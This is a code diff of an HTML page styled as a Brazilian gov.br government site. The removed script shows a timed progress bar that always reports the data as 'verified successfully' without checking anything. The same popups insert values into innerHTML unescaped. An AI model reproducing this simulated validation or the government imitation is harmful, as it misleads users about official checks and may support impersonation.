-                    const progressEl = document.getElementById('validation-progress');
-
-                    messageEl.textContent = mensagem;
-                    detailsEl.textContent = detalhes;
-                    progressEl.style.width = '0%';
-                    popup.classList.remove('hidden');
-
-                    setTimeout(() => progressEl.style.width = '30%', 200);
-                    setTimeout(() => progressEl.style.width = '60%', 800);
-                    setTimeout(() => progressEl.style.width = '100%', 1400);
-
-                    setTimeout(() => {
-                        messageEl.textContent = 'Validação concluída';
-                        detailsEl.textContent = 'Dados verificados com sucesso';
-                        setTimeout(() => {
-                            popup.classList.add('hidden');
-                        }, 800);
-                    }, 2000);
-                }
-
-                function mostrarValidacaoSucesso(localidade, uf, estado) {
-                    const popup = document.getElementById('validation-popup');
-                    popup.innerHTML = `
-                <div class="bg-white border-2 border-green-600 rounded-lg shadow-lg p-4 min-w-64">
-                    <div class="flex items-center">
-                        <div class="w-5 h-5 bg-green-600 rounded-full flex items-center justify-center mr-3">
-                            <i class="fas fa-check text-white text-xs"></i>
-                        </div>
-                        <div>
-                            <p class="text-sm font-medium text-green-800">CEP Validado com Sucesso</p>
-                            <p class="text-xs text-green-600">${localidade} - ${uf}, ${estado}</p>
-                        </div>
-                    </div>
-                    <div class="mt-2 bg-green-200 rounded-full h-1">
-                        <div class="bg-green-600 h-1 rounded-full w-full"></div>
-                    </div>
-                </div>
-            `;
-                }
-
-                function mostrarValidacaoErro(mensagem, detalhes) {
-                    const popup = document.getElementById('validation-popup');
-                    popup.innerHTML = `
-                <div class="bg-white border-2 border-red-600 rounded-lg shadow-lg p-4 min-w-64">
-                    <div class="flex items-center">
-                        <div class="w-5 h-5 bg-red-600 rounded-full flex items-center justify-center mr-3">
-                            <i class="fas fa-times text-white text-xs"></i>
-                        </div>
-                        <div>
-                            <p class="text-sm font-medium text-red-800">${mensagem}</p>
-                            <p class="text-xs text-red-600">${detalhes}</p>
-                        </div>
-                    </div>
-                    <div class="mt-2 bg-red-200 rounded-full h-1">
-                        <div class="bg-red-600 h-1 rounded-full w-full"></div>
-                    </div>
-                </div>
-            `;
-                    setTimeout(() => {
-                        popup.classList.add('hidden');
-                    }, 3000);
-                }
-            });
-        </script>
-
-
     </main>
 
+    <!-- Footer -->
     <footer class="bg-[#0a1f44] text-white">
         <div class="container mx-auto px-6 py-4">
+            <!-- Logo -->
             <div class="py-6">
-                <img src="images/1200px-Gov.br_logo.svg.png"
-                    alt="Government of Brazil logo showing gov.br in white text" class="w-40">
+                <img src="images/1200px-Gov.br_logo.svg.png" class="w-40">
             </div>
 
+            <!-- Divider -->
             <div class="border-t border-gray-600"></div>
 
+            <!-- Navigation Menu -->
             <nav aria-label="Menu principal do rodapé">
                 <ul>
                     <li class="py-3">
@@ -591,7 +430,7 @@
                     </li>
                     <li class="border-t border-gray-600 py-3 flex justify-between items-center">
                         <a href="#" class="text-sm hover:text-gray-300">Saúde BÁSICA</a>
-                        <button class="footer-expand-btn" aria-label="Expandir seção Saúde Básica">
+                        <button class="footer-expand-btn" aria-label="Expandir seçãoSaúde Básica">
                             <i class="fas fa-chevron-down text-xs"></i>
                         </button>
                     </li>
@@ -625,10 +464,17 @@
                             <i class="fas fa-chevron-down text-xs"></i>
                         </button>
                     </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">POLÍTICAS EDUCACIONAIS</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Políticas Educacionais">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
                     <li class="border-t border-gray-600"></li>
                 </ul>
             </nav>
 
+            <!-- Cookie Settings -->
             <div class="mt-6 flex items-center">
                 <button id="cookie-settings" class="flex items-center hover:text-gray-300"
                     aria-label="Redefinir configurações de cookies">
@@ -637,6 +483,7 @@
                 </button>
             </div>
 
+            <!-- Social Networks -->
             <div class="redes-e-logos mt-8">
                 <div class="redes-sociais">
                     <div class="titulo text-sm font-bold mb-4">Redes sociais</div>
@@ -667,6 +514,7 @@
         </div>
     </footer>
 
+    <!-- Search Modal -->
     <div id="search-modal" class="search-modal hidden">
         <div class="search-modal-content">
             <div class="search-modal-header">
@@ -687,7 +535,6 @@
         </div>
     </div>
 
-    <script src="js/main.js"></script>
 
 </body>
 
